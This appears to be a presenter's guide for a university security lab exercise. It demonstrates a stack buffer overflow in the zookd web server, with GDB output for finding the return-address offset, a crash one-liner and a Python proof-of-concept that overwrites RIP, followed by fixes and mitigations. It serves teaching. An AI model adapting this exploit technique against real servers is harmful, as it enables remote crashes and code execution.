# Exercise 1 - Step-by-Step Demonstration Guide

## Preparation Checklist
- [ ] Read through all documents
- [ ] Compile the server (`make`)
- [ ] Test server starts correctly
- [ ] Have terminal windows ready
- [ ] Review vulnerable code

---

## Part 1: Show the Architecture (5 minutes)

### Step 1: Explain the Application
"This is a simple web server called zookd that serves HTTP requests."

**Show the main flow:**
```bash
# Show the main files
ls -la zookd.c http.c

# Show it's compiled
ls -la zookd zookd-exstack
```

**Explain:**
- `zookd.c` - Main daemon, accepts connections, forks child processes
- `http.c` - HTTP request handling, parsing, serving files
- Each HTTP request is handled by a forked child process

### Step 2: Demonstrate Normal Operation
```bash
# Terminal 1: Start the server
./zookd 8080

# Terminal 2: Test normal request
curl http://localhost:8080/
# or
echo -e "GET / HTTP/1.0\r\n\r\n" | nc localhost 8080
```

**Explain what happens:**
1. Server listens on port 8080
2. Accepts connection
3. Forks child process
4. Child calls `process_client()`
5. Parses HTTP request
6. Calls `http_serve()` to serve the file

---

## Part 2: Identify the Vulnerability (10 minutes)

### Step 3: Show the Vulnerable Code

**Open http.c and navigate to line 273:**
```bash
# Show the code
sed -n '273,301p' http.c
```

**Point out the vulnerable function:**
```c
void http_serve(int fd, const char *name)
{
    void (*handler)(int, const char *) = http_serve_none;
    char pn[2048];              // ← "This buffer is on the stack"
    struct stat st;

    getcwd(pn, sizeof(pn));     // ← "Gets current directory"
    setenv("DOCUMENT_ROOT", pn, 1);

    // ← "Here's the bug!"
    if (strlen(name) + strlen(pn) + 1 >= sizeof(pn)) {
        http_err(fd, 500, "Request too long");
        return;
    }
    // ← "This can overflow!"
    strncat(pn, name, sizeof(pn) - strlen(pn) - 1);
    split_path(pn);
    // ...
}
```

### Step 4: Explain the Vulnerability

**The Bug:**
1. "The check uses `>=` instead of `>`"
2. "When the total length equals 2048, it passes the check"
3. "But then `strncat()` writes beyond the buffer"
4. "This overwrites data on the stack"

**Draw on whiteboard/show diagram:**
- Stack grows downward (high to low addresses)
- `pn[2048]` buffer is at bottom of function's stack frame
- Above it: struct stat, saved registers, saved return address
- Overflow goes upward in memory

**Show STACK_DIAGRAM.txt:**
```bash
cat STACK_DIAGRAM.txt
```

---

## Part 3: Find Exact Addresses with GDB (10 minutes)

### Step 5: Debug the Server

**Terminal 1: Start server (if not running)**
```bash
./zookd 8080 &
```

**Terminal 2: Attach GDB**
```bash
# Attach to the main process
gdb -p $(pgrep zookd)
```

**In GDB:**
```gdb
# Set to follow child processes
(gdb) set follow-fork-mode child

# Set breakpoint at vulnerable function
(gdb) break http_serve
Breakpoint 1 at 0x...

# Continue execution
(gdb) continue
```

**Terminal 3: Send HTTP request**
```bash
curl http://localhost:8080/test
```

**Back in GDB (Terminal 2):**
```gdb
# Breakpoint should hit at line 275
Thread 2.1 "zookd" hit Breakpoint 1, http_serve (fd=4, name=0x101b6e4c "/test") at http.c:275
275     void (*handler)(int, const char *) = http_serve_none;

# IMPORTANT: Check addresses BEFORE executing next
# Print address of pn[] buffer
(gdb) print &pn
$1 = (char (*)[2048]) 0x7ffdc103fa40

# Get info about the stack frame
(gdb) info frame
Stack level 0, frame at 0x7ffdc1040270:
 rip = 0x4013af in http_serve (http.c:275)
 saved rip = 0x400b07 at 0x7ffdc1040268    ← "This is our target!"
 ...

# Calculate the distance
(gdb) print 0x7ffdc1040268 - 0x7ffdc103fa40
$2 = 2088
```

**Explain:**
- "The buffer starts at 0x7ffdc103fa40"
- "The saved return address is at 0x7ffdc1040268"
- "That's 2088 bytes difference"
- "So we need to write 2088 bytes to reach the return address"
- "Then 8 more bytes to overwrite it"

**Continue in GDB:**
```gdb
# IMPORTANT: At this point, pn is uninitialized (garbage data)
# We need to execute getcwd() first!

# Execute the next line (initializes handler pointer)
(gdb) next
279     getcwd(pn, sizeof(pn));

# Execute getcwd() - this fills pn with current directory
(gdb) next
280     setenv("DOCUMENT_ROOT", pn, 1);

# NOW check pn contents (after getcwd executed)
(gdb) print pn
$3 = "/home/amirkhalifa/Desktop/Advanced_cyber/lab/lab", '\000' <repeats 2000 times>

# Check the length (need to cast)
(gdb) print (int)strlen(pn)
$4 = 48    ← "Remember this number!"

# Or count manually from the string above
# /home/amirkhalifa/Desktop/Advanced_cyber/lab/lab = 48 characters

# Continue execution to finish the request
(gdb) continue

# You can quit GDB
(gdb) quit
```

---

## Part 4: Demonstrate the Crash (5 minutes)

### Step 6: Create Simple Crash Exploit

**Show the exploit concept:**
"Now that we know the addresses, we can craft a malicious HTTP request."

**Calculate payload size:**
```python
# In Python or on paper
buffer_start = 0x7fffffffd4a0
saved_rip = 0x7fffffffdcc8
offset = saved_rip - buffer_start  # 2088 bytes

cwd_length = 48  # From gdb
payload_size = offset - cwd_length  # 2040 bytes
```

**Show that a long URL crashes the server:**
```bash
# Terminal 1: Make sure server is running
pkill zookd
./zookd 8080 &

# Terminal 2: Send a really long request
python3 -c "print('GET /' + 'A'*3000 + ' HTTP/1.0\r\n\r\n')" | nc localhost 8080
```

**Check the crash:**
```bash
# Should see message like:
# Child process XXXX terminated incorrectly, receiving signal 11

# Check kernel logs
dmesg | tail -5
# Should show: "segfault at ... ip ... sp ..."
```

**Explain:**
- "Signal 11 is SIGSEGV - segmentation fault"
- "The program tried to jump to an invalid address"
- "This means we successfully overwrote the return address!"

---

## Part 5: Verify Control (Advanced - Optional, 5 minutes)

### Step 7: Verify We Control RIP

**Create a more precise exploit:**

```python
# test_exploit.py
#!/usr/bin/env python3
import socket
import struct

def p64(addr):
    return struct.pack('<Q', addr)

# From gdb session
cwd_len = 48
offset = 2088 - cwd_len  # 2040

# Create payload
padding = b"A" * offset
fake_rbp = b"B" * 8
new_rip = p64(0x4141414141414141)  # "AAAAAAAA" in hex

payload = padding + fake_rbp + new_rip
request = b"GET /" + payload + b" HTTP/1.0\r\n\r\n"

# Send it
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 8080))
sock.send(request)
sock.close()
```

**Run with GDB watching:**
```bash
# Terminal 1: Start with GDB
gdb ./zookd
(gdb) set follow-fork-mode child
(gdb) run 8080

# Terminal 2: Run exploit
python3 test_exploit.py

# Back in Terminal 1 (GDB):
# Should see crash at 0x4141414141414141
# This proves we control the instruction pointer!
```

---

## Part 6: Explain Impact and Mitigation (5 minutes)

### Step 8: Discuss the Impact

**What an attacker can do:**
1. "Crash the server (Denial of Service)"
2. "Execute arbitrary code" 
3. "Delete files, steal data, take over the system"
4. "All from a simple HTTP request!"

**Why this is dangerous:**
- No authentication needed
- Remote attack over network
- Can be automated
- Hard to detect without proper logging

### Step 9: Discuss Defenses

**Why the server is vulnerable:**
1. Compiled with `-fno-stack-protector` (no canaries)
2. No ASLR (addresses are predictable)
3. Executable stack (can run shellcode)
4. Poor input validation

**How to fix:**
```c
// WRONG (current code):
if (strlen(name) + strlen(pn) + 1 >= sizeof(pn)) {

// RIGHT:
if (strlen(name) + strlen(pn) + 1 > sizeof(pn)) {

// BETTER:
if (strlen(name) >= sizeof(pn) - strlen(pn) - 1) {

// BEST:
snprintf(pn + strlen(pn), sizeof(pn) - strlen(pn), "%s", name);
```

**System-level protections:**
- Stack canaries (detect overwrites)
- ASLR (randomize addresses)
- NX/DEP (non-executable stack)
- Address Sanitizer (detect memory errors)
- Fuzzing (find bugs automatically)

---

## Summary Points for Q&A

**Be ready to explain:**

1. **"What is a buffer overflow?"**
   - Writing more data than allocated space
   - Overwrites adjacent memory
   - Can corrupt program state or control flow

2. **"How does the attacker control execution?"**
   - Overwrites saved return address on stack
   - When function returns, CPU jumps to attacker's address
   - Can point to attacker's code (shellcode)

3. **"Why is the stack vulnerable?"**
   - Local variables stored on stack
   - Return addresses stored on stack
   - Stack is writable but shouldn't be executable
   - No separation between data and control information

4. **"How do you find these vulnerabilities?"**
   - Code review (look for unsafe functions)
   - Static analysis tools
   - Dynamic testing / fuzzing
   - Manual testing with crafted inputs

5. **"What's next?"** (Preview Exercise 2-4)
   - Exercise 2: Actually crash the server
   - Exercise 3: Write shellcode
   - Exercise 4: Exploit to delete files

---

## Troubleshooting Tips

**If server doesn't crash:**
- Check payload size calculation
- Verify cwd length with `pwd | wc -c`
- Adjust offset in exploit
- Try with gdb to see what's happening

**If addresses are different:**
- This is expected if ASLR is on
- Use gdb each time to find addresses
- For the lab, ASLR should be off

**If segfault location is weird:**
- Might be crashing in different function
- Check dmesg for actual fault address
- Adjust payload accordingly

---

## Time Management

Total demo: ~30-40 minutes

- Introduction: 2 min
- Architecture: 5 min  
- Vulnerability: 10 min
- GDB session: 10 min
- Crash demo: 5 min
- Impact/mitigation: 5 min
- Q&A: 5 min

**Practice this at least twice before presenting!**

Good luck! 🎯
